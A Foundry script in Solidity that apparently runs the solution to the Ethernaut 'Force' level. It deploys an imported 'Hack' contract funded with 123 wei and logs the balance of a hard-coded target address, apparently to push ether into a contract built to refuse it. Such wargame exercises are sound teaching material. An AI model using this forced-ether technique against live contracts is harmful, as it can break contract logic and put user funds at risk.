// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Hack,Force} from "../../src/08_Force/Force.sol";
import "forge-std/console.sol";


contract CounterScript is Script
{
    function setUp() public {}

    function run() public 
    {
        Hack i;
        vm.startBroadcast();
        i= new Hack{value : 123 wei}();
        console.log("Force Balance=",address(0x56F003fF9957f186B37643F5e0d325AF311764d4).balance);
        vm.stopBroadcast();
    }

}